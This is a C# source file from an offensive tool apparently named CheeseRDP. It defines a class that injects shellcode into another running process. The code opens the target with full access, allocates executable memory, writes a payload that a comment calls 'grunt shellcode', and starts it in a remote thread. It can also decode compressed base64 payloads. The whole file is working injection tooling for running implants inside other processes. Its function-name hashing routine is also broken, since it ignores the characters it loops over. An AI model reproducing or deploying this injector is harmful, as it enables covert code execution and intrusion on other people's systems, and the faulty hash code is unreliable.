using System;
using System.Diagnostics;
using System.IO;
using static CheeseRDP.Win32;

namespace CheeseRDP
{
    class DllMapper
    {

        byte[] dllBytes;
        bool DEBUG = false;

        public static uint RotateRight(uint val, int count)
        {
            return (val >> count) | (val << (32 - count));
        }

        public static uint HashFunction(string name)
        {
            uint functionHash = 0;

            foreach (char c in name + char.MinValue)
            {
                functionHash += RotateRight(functionHash, 13);
            }

            return functionHash;
        }


        public DllMapper(string dllName, bool debug = false)
        {
            this.dllBytes = File.ReadAllBytes(dllName);
            this.DEBUG = debug;
        }

        public DllMapper(byte[] shellcode, bool debug = false)
        {
            this.dllBytes = shellcode;
            this.DEBUG = debug;
        }

        public static byte[] FromBase64GZipped(string base64data, int iterations)
        {

            try
            {
                return GZipHelper.NUnzip(Convert.FromBase64String(base64data), iterations);
            }
            catch
            {
                Console.WriteLine("[-] Error Unzipping");
                Environment.Exit(1);
            }
            return null;

        }

        public bool Map(Process targetProcess)
        {

            IntPtr scPointer;

            try
            {
                // Get a handle to the target process
                var hProcess = Win32.OpenProcess(
                    Win32.ProcessAccessFlags.All,
                    false,
                    targetProcess.Id
                );

                if (hProcess != IntPtr.Zero)
                    if (this.DEBUG)
                        Console.WriteLine("[>] Got handle to {0}", targetProcess.ProcessName);

                // Allocate region of memory in the target process
                scPointer = Win32.VirtualAllocEx(
                    hProcess,
                    IntPtr.Zero,
                    (uint)this.dllBytes.Length,
                    (uint)AllocationType.Commit | (uint)AllocationType.Reserve,
                    (uint)MemoryProtection.ExecuteReadWrite
                );

                if (scPointer != IntPtr.Zero)
                    if (this.DEBUG)
                        Console.WriteLine("[>] Allocated memory region");

                // Copy grunt shellcode to target process
                UIntPtr bytesWritten;
                var shellcodeWritten = Win32.WriteProcessMemory(
                    hProcess,
                    scPointer,
                    this.dllBytes,
                    (uint)this.dllBytes.Length,
                    out bytesWritten
                );

                if (shellcodeWritten)
                    if (this.DEBUG)
                        Console.WriteLine("[>] Shellcode written");

                // Create a thread in the target process to execute the shellcode
                IntPtr threadId;
                var hThread = Win32.CreateRemoteThread(
                    hProcess,
                    IntPtr.Zero,
                    0,
                    scPointer,
                    IntPtr.Zero,
                    0,
                    out threadId
                );

                if (hThread != IntPtr.Zero)
                    if (this.DEBUG)
                        Console.WriteLine("[>] Remote Thread started");

                if (this.DEBUG)
                    Console.WriteLine("[>] Done!");
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("[x] Error:");
                Console.Error.WriteLine("    {0}", e.Message);
                Console.Error.WriteLine("    {0}", e.StackTrace);
            }

            return true;
        }
    }
}
